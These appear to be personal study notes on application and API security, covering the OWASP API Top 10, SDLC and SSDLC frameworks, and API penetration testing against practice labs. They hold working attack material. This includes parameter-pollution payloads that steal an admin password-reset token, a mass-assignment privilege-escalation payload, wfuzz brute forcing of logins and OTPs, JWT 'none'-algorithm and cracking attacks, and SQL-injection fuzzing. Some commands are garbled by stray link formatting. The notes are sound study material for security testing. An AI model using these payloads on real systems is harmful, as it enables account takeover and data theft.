# APPSEC && APISEC

- DAST - Dynamic Application Security Testing
    - Involves after production testing which is mostly black box with tools like ZAP, accunetix, veracode and gitlab
- SAST - Static Application Security Testing
    - Involves code review before launch which is mostly white box with tools like veracode, fortify, Synk, Checkmarx, Semgrep
- CI/CD - Continuous Integration and continuous Delivery or Deployment
- REST - Representational State Transfer
- SOAP - Simple Object Access Protocol

# Gitlab integration

- Proxy based DAST - simple website technology like HTML and CSS
- Browser based analyzer - heavily based on JavaScript
- API DAST analyzer - testing APIs

---

# APISEC

- Machine-readable documentation is designed to be processed by software for automating tasks like API integration and validation. It's written in structured formats like JSON or XML.

[+] API documentation, for example:

- /api
/swagger/index.html
/openapi.json
- test for each parameter by gradually deleting the path

[+] investigate how the API responds to changing the HTTP method and media type.

- GET - Retrieves data from a resource.
- PATCH - Applies partial changes to a resource.
- OPTIONS - Retrieves information on the types of request methods that can be used on a resource.

[+]  Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.

- To change the content type, modify the Content-Type header

[+] intercept and click on a product and get the API endpoint from HTTP history.

- Change the GET to PATCH
- Add Content-Type: application/json and a JSON price to the body

```json
Content-Type: application/json

{
"price":0
}
```

- Forward request

[+] Mass assignment vulnerabilities (also known as auto-binding):  can inadvertently create hidden parameters. It occurs when software frameworks automatically bind request parameters to fields on an internal object. 

[+] Identifying hidden parameters: 

- test any boolean (TRUE/FALSE) value on the API request
- read through JSON and compare request and responses

[+] Prevention of API hacks

- Secure your documentation if you don't intend your API to be publicly accessible.
- Ensure your documentation is kept up to date so that legitimate testers have full visibility of the API's attack surface.
- Apply an allowlist of permitted HTTP methods.
- Validate that the content type is expected for each request or response.
- Use generic error messages to avoid giving away information that may be useful for an attacker.
- Use protective measures on all versions of your API, not just the current production version.

# Server-side parameter pollution:

[+] Server-side parameter pollution ( HTTP parameter pollution): Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. 

[+] To test for server-side parameter pollution in the query string, place query syntax characters like #, &, and = in your input and observe how the application responds.

- Truncating query strings: You can use a URL-encoded # character to attempt to truncate the server-side request.
- Injecting valid parameters: You can use an URL-encoded & character to attempt to add a second parameter to the server-side request.
- This varies across different web technologies. For example:
- PHP parses the last parameter only. This would result in a user search for carlos.
- [ASP.NET](http://asp.net/) combines both parameters. This would result in a user search for peter,carlos, which might result in an Invalid username error message.
- Node.js / express parses the first parameter only. This would result in a user search for peter, giving an unchanged result.

```json
GET /userSearch?name=peter%26foo=xyz&back=/home
```

- test server side request with <&x=y#> make sure you truncate

[+] enter a user name<e.g administrator> and request for password reset 

- Test and bruteforce the <&x=y#>
- Replace the x with field and bruteforce the y with lists of Server-side list payloads <id, email, username, text …..>
- Replace the y with a server side word that came back as 200OK
- Read through the static/forget-assword.js file if one is present and check for what ?forget_password is equal to
- If you find it equal to <rest_token> add it to

```json
username=administrator%23field=resest_token%23>
```

- Send the request and you should get a paswd reset token for administrator account
- Past in front of URL <forget_password?reset_token=123….>
- Reset the password

[Server-side parameter Pollution/Password reset]

# Testing for server-side parameter pollution in REST paths

[+] A RESTful API may place parameter names and values in the URL path, rather than the query string

```json
/api/users/123
```

- To test for this vulnerability, add path traversal sequences to modify parameters and observe how the application responds <URL-encoded peter/../admin>
- Navigate to the API definition: ——>
- test url parameter with <../../../../%23> OR <../../../../openapi.json%23> and notice the error message: ———>
- /api/internal/v1/users/{username}/field/{field}

Notice that this endpoint indicates that the URL path includes a parameter called field.

- add <username=administrator/field/foo%23> to the parameter path again. You should be corrected on the right server-side parameter to use if wrong or you can bruteforce it
- In Proxy > HTTP history, review the /static/js/forgotPassword.js JavaScript file. Identify the password reset endpoint, which refers to the passwordResetToken parameter: </forgot-password?passwordResetToken=${resetToken}>
- from error message you should get api endpoint add it <=../../v1/users/administrator/field/passwordResetToken%23> to parameter
- get password rest token from response after forwarding URL
- add <forgetpasswordpasswordResetToken=w0fcc3lrbdicm6mgb5xgrrn59l128dqw> to URL on browser and try to reset password.

# Testing for server-side parameter pollution in structured data formats

[+] To test for this, inject unexpected structured data into user inputs and see how the server responds.

- You can attempt to add the access_level parameter to the request

```json
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```

- this may result in the user peter being given administrator access.

# Testing with automated tools

[+] You can also use the Backslash Powered Scanner BApp to identify server-side injection vulnerabilities

- Burp Scanner automatically detects suspicious input transformations when performing an audit. Then do a manual  check

# Preventing server-side parameter pollution

[+] To prevent server-side parameter pollution, use an allowlist to define characters that don't need encoding, and make sure all other user input is encoded before it's included in a server-side request. You should also make sure that all input adheres to the expected format and structure.

# A third method to detect APIs is to look for common paths like:

-https://target.domain/apihttps://target.domain/v1
-https://target.domain/v2 etc

https://target.domain/graphql

https://target.domain/swagger

https://target.domain/docs

https://target.domain/rest

[+] https://owasp.org/API-Security/editions/2023/en/0x11-t10/

[API TOP 10]

# API1:2023 Broken Object Level Authorization (BOLA)

- The most damaging of the API top 10. It involves manipulating IDs and gaining access to records that do not belong to you, leading to data loss, manipulation and disclosure.
- Object IDs can be anything from sequential integers, UUIDs, or generic strings.
- If an attacker manages to access an API endpoint/function they should not have access to - this is a case of Broken Function Level Authorization (BFLA) rather than BOLA.

[+] Example

- An online document storage service allows users to view, edit, store and delete their documents. When a user's document is deleted, a GraphQL mutation with the document ID is sent to the API.

```graphql
POST /graphql
{  "operationName":"deleteReports",  
"variables":{
    "reportKeys":["<DOCUMENT_ID>"]  
    },  
    "query":"mutation deleteReports($siteId: ID!, $reportKeys: [String]!) {    
    {  
      deleteReports(reportKeys: $reportKeys)    
      }  
    }"
  }
```

- Since the document with the given ID is deleted without any further permission checks, a user may be able to delete another user's document.
- In terms of prevention, it’s critical to thoughtfully define what your access control policies are. To know what access and date a given user or given role should have, and then enforce those policies at the application logic layer.
- Access control should be enforced within the application logic itself

# API2:2023 Broken Authentication

- This is about weak or non-existent authentication to endpoint. The exposure is the ability to access other users’ accounts, data theft, unauthorized transactions.

[+] EXAMPLE 

- Examples includes; weak password requirements, lack of CAPTCHAs or rate limiting, lack of lockouts on accounts, bruteforce of IDs and passwords, changing password without authentication or verification, not validating tokens, Sends sensitive authentication details, such as auth tokens and passwords in the URL.
- In order to perform user authentication the client has to issue an API request like the one below with the user credentials:

```graphql
POST /graphql
{ 
  "query":"mutation {  
     login (username:\"<username>\",password:\"<password>\") {
        token
     }   
    }"
 }
```

- If credentials are valid, then an auth token is returned which should be provided in subsequent requests to identify the user. Login attempts are subject to restrictive rate limiting: only three requests are allowed per minute.
To brute force log in with a victim's account, bad actors leverage GraphQL query batching to bypass the request rate limiting, speeding up the attack

1. In order to update the email address associated with a user's account, clients should issue an API request like the one below:

```graphql
PUT /accountAuthorization: Bearer <token>
{ "email": "<new_email_address>" }
```

- Because the API does not require users to confirm their identity by providing their current password, bad actors able to put themselves in a position to steal the auth token might be able to take over the victim's account by starting the reset password workflow after updating the email address of the victim's account.

[+] PREVENTION 

- properly define what your authentication requirements are and to tailor those requirements to the use case.
- Enforcing strict authentication on endpoints that's access PII
- Implementing application logic to ensure that users only see what they're entitled to see.
- Implement anti-brute force mechanisms to mitigate credential stuffing, dictionary attacks, and brute force attacks on your authentication endpoints
- Implement continuous testing to make sure no changes are creeping into code logic or into the infrastructure that may be exposing new authentication vulnerabilities.

# Types of API

- Public API
- Private API
- Partner API
- Composite API

# 3 Pillars of API Security are Governance, Testing and Monitoring (GTM)

# API PENETRATION TESTING

[+] http://127.0.0.1:8000/vapi

[start vapi]

RECON:

- PASSIVE RECON:

[+] intitle:"api" site:"WEBSITE[.com](http://coinbase.com/)"

[+] inurl:"/api/v1" site:"website[.com](http://coinbase.com/)"

[+] intitle:json site:"website[.com](http://microsoft.com/)"

[+] use github search

[+] mitmweb

- open on 127.0.0.1:8081

[Reverse engineer with mitmweb]

[+] mitmproxy2swagger -i crapi.apisec.ai.har -o crapi.yml -p [http://crapi.apisec.ai](http://crapi.apisec.ai/) -e -f har --examples

- sudo mitmproxy2swagger -i flows -o spec.yml -p [http://crapi.apisec.ai](http://crapi.apisec.ai/) -f flow --examples
- run the above command one more time after removing the “ignore” from your desired api endpoints
- import to swagger editor

[create rogue API endpoint with dev tool OR mitmweb]

[+] Bruteforce json using wfuzz 

- wfuzz -d '{"[email":"testninja@gmail.com](mailto:email%22:%22testninja@gmail.com)","password":"Test@test"}' -H 'Content-type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://crapi.apisec.ai/login/identity/api/auth/login --hc 500

#JWT_TOOL: (BOLA/BFLA)

[+] jwt_tool eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ0ZXN0bmluamFAZ21haWwuY29tIiwiaWF0IjoxNzQ0MjMyNTE3LCJleHAiOjE3NDQzMTg5MTd9.FhmjqYaVEB0BeWwJxNTxu61u6GfWzzcub1t7wT5yCiiTKhCbcvyjZcXowGAN_eXyfc4ZjOOXt3OSPf6osWE0hA

[check jwt]

[+] jwt_tool -t http://crapi.apisec.ai/identity/api/v2/user/dashboard -rh "Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ0ZXN0bmluamFAZ21haWwuY29tIiwiaWF0IjoxNzQ0MjMyNTE3LCJleHAiOjE3NDQzMTg5MTd9.FhmjqYaVEB0BeWwJxNTxu61u6GfWzzcub1t7wT5yCiiTKhCbcvyjZcXowGAN_eXyfc4ZjOOXt3OSPf6osWE0hA" -M pb

[scan url with jwt]

[+] jwt_tool <token> -X a

[algorithm none attack]

[+] JWT cracking with crunch

- crunch 5 5 -o crAPI.txt
- jwt_tool <token> -C -d <crunch-wordlist-path>

#Improper Assets Management

[+] Group all API version you want to work with in a collection

- go to find and replace and select the collection with the name of the version (v1 OR v2)
- set environmental variable {{ver}} and set API version name you want to work with in the value and current value.
- set {{ver}} “replace with” in find and replace and “select all”
- Find and Replace also for v3 version and leave the environmental variable value as v1 to test
- Test as unauthenticated and non-authenticated user and view all runs once test is done

[+] wfuzz -d '{"[email":"testninja@gmail.com](mailto:email%22:%22testninja@gmail.com)", "otp”:"FUZZ", "password":"Newpassword1"}' -H 'Content-type: application/json' -z file,/usr/share/wordlists/SecLists/Fuzzing/4-digits-0000-9999.txt  -u [http://crapi.apisec.ai/identity/api/auth/v2/check-otp](http://crapi.apisec.ai/login/identity/api/auth/v2/check-otp) --hc 500

[Fuzz OTP and change password with wfuzz]

#Mass Assignment

[+] Check for parameters to pass requests using param miner

[+] Try changing the CRUD functionality to do something unusual on the server. Like add product to a shop or add money to your account using a negative balance maunipulation.

#SSRF

[+] ifconfig.pro

- webhook.site
- pingb.in
- requestbin.com
- canarytokens.org

[SSRF testing site]

[+] Target full URLs in POST body or parameter

- URL paths (or partial URLs) in the POST body or parameters
- Headers that include URLs like Referrer
- Allows for user that may result in a server retrieving resources

[+] In In-Band SSRF the content of the URL supplied is displayed back in a response

#Injection Vulnerability

[+] You can test by adding {{fuzz}} parameter to the endpoints or input and “fuzz” with payload as value to the environmental variable

[+] You can also fuzz parameters with intruder or wfuzz

[+] fuzzing for sql injection using wfuzz

- wfuzz -w /usr/share/wordlists/sqlmap.txt -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ0ZXN0bmluamExQGdtYWlsLmNvbSIsImlhdCI6MTc0NDczNTY4MywiZXhwIjoxNzQ0ODIyMDgzfQ.lsSTpSWeWrTbiO2xm_D6a-bZ7wqdGLbpONh3XnKxGk1AZDcoaZeh9k5u_H-Ib5nfUNCDq8bQXkU0erKiDLa1XQ" -d '{\"coupon_code\":"FUZZ"}' --sc 200 http://crapi.apisec.ai/community/api/v2/coupon/validate-coupon
- you can proxy request to burp using -p localhost:8080

#Evasion

[+] Case switching, Encoding, Null bytes

[+] use wfuzz to encode

- <wfuzz -e encoders> this will show the lists of encoding option available in wfuzz
- wfuzz -z file,wordlist/api/common.txt,base64 http://hapihacker.com/FUZZ
- wfuzz -z list,TEST,base64-md5-none
- 

---

# TRICKS

[+] mitmproxy2swagger -i crapi.apisec.ai.har -o crapi.yaml -p [http://crapi.apisec.ai](http://crapi.apisec.ai/) -e -f har

[create rogue API endpoint]

[+] : If you playing with `API ENDPOINT` always try to send `INVALID CONTENT TYPE` end-up by getting hidden endpoints in `RESPONSE` 

[+] Leak PII sensitive API Users DATA with URL Path Permutations: /api/users/user@email.com -> /api/users/..%2Fuser@email.com or /api/account/123/ -> /api/account/..%2F..%2F123

[+] Crack JWT token. Save the JWT in file called hash 

- hashcat -a 0 -m 16500 hash /usr/share/wordlists/rockyou.txt

[+] curl blablah -d | jq

[Beautiful JSON]

[+] Bypassed coupon code API Endpoint using dilema [ 2,2,2 or 2;2;2 or 222

---

# Software lifecycle:{Application Security}

# SDLC (SOFTWARE DEVELOPMENT LIFECYCLE)

[+] Includes 6-8 stages which are;

- Planning - allocation of materials needed
- Requirement definition - SRS (SOFTWARE REQUIREMENT SPECIFICATION)
- Design and Prototyping - what the interface would look like and what features to be added, templates. Architecture Design Review (ARD)  comes in
- Software development - code is written and documented.
- Testing - QA, Test case design and development, test environment set up and test execution.
- Deployment - Popular Software Deployment tools are Netlify and Argo CD.
- Operation and Maintenance

# CALMS:

[+] It's a framework that assesses a company's ability to adopt DevOps processes.

- Culture - culture shift with an organization for security approach by adoption or bringing in new method
- Automation
- Lean - breaking down tasks as small as possible and creating initial version (beta) to be delivered to users instead of waiting to perfect the software
- Measurement - a list of metrics to record and apply changes or features from Beta feedbacks to better the software
- Sharing - sharing of responsibility during the SDLC for improve the software.

# DevOps metrics:

Brooke's Law : Adding human resources to a late software project will make it later

[+] Deployment speed and Frequency are used to measure deployment agility.

- MTTP (Meantime To Production) - length of time between when a code CHANGE is committed and when it's in deployed state. Shorter MTTP is what we need.
- Failure Rate - involves major fixes that comes after a code change. Tracking and reporting failure rates are essential for ensuring new code releases meet security requirements
- Deployment Frequency - measurements of time  a code/software is released into pre-production staging environment
- MTTR (Meantime To Recovery) - measurements or average length in time when an error occurs in production stage. If a failure occurs, a fix must be deployed as soon as possible, or the changes that caused the failure must be rolled back
- Communicating risk

# SSDLC (Secure Software Development Lifecycle)

[+] Secure SDLC involves instilling security processes at all lifecycle phases. From security testing tools to writing security requirements alongside functional requirements.

[+] SSDLC Processes;

- Risk Assessment - security considerations, functionalities and requirements. Includes factors like WORST CASE SCENARIO. Best done in early stage of SDLC
    - Qualitative Risk Assessment: it is commonly found in companies and involves grading severity of risk. (Risk = Severity X Likelihood
    - Quantitative Risk Assessment: used to measure risk Severity in numerical value.
- Threat modeling - identification of potential threat where safe guarding is needed. Best don in the design phase before any code is written. Prioritizing techniques to mitigate attacks. Methodologies include;
    - STRIDE(Spoofing, Tampering, Repudiation, Information Disclosure, Denial Of Service, and Elevation/Escalation of Privilege): Built on principles of the CIA triad. Security professionals that perform STRIDE are looking to answer "What could go wrong with this system".
    - DREAD(Damage Potential, Reproducibility, Exploitability, Affected Users and Discoverability): it's a model that ranks threat by assigning the threats according to their severity and priority
    - PASTA(Process for Attack Simulation and Threat Analysis): involves the threat modelling process from analysing threats to finding ways to mitigate them, but on a more strategic level and from an attacker's perspective. Divided into 7 stages;
        - Define objective - nothing structures
        - Define technical scope - architectural structures are defined
        - Decomposition & Analysis - mapping threat vector
        - Threat Analysis - identifying which application is vulnerable to certain threat vectors
        - Vulnerabilities & Weaknesses Analysis - identifies and enumerates security flaws in applications
        - Attack/Exploit Enumeration & Modelling - identifying potential risks or threats
        - Risk Impact Analysis - contains steps to mitigate and eliminate risks
- Code scanning/Review - SAST & DAST - synk, sonarqube, jira, gitlab
    - Mobile: MobSF, Jadx and Apktool | appetiz/Andriod studio for mobile DAST
    - SAST : Static because the test is done before an application is live and running.  Also contains SCA (Software Composition Analysis) . It is white box
    - DAST: it does not access to application’s source code. it is Black box
    - IAST: testing and analyzing code for vulnerabilities while the app is running. It is Grey box. Involves the RASP (Runtime Application Security Protection) analysis the inward and outward traffic behavior of users
- Security Assessment - involves VA & PT. They test for holistic point of view of Applications so they're carried out at the end of SDLC

# Methodologies in SSDLC:

- Microsoft SDL:
    - Secure by Design
    - Secure by Default
    - Secure by Deployment
    - Communication
- OWASP SSDLC - done by following Agile security approach where Sprints are dedicated to security. Involves the Software Assurance Maturity Model (SAMM)
    - Building Security In Maturity Model (BSIMM) - acts as the measuring stick to determine your security posture
- Software Security Touchpoints

# Tips

[+] curl -s URL | grep -Po "(\/)((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)*((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)((?:[a-zA-Z\-_\/\:\.0-9\{\}]+))" | sort -u

[ Get all API endpoint from ajax js] 

# Resources:

- https://danaepp.com/the-api-hackers-guide-to-payload-injection-with-postman
- https://owasp.org/API-Security/editions/2023/en/0x11-t10/
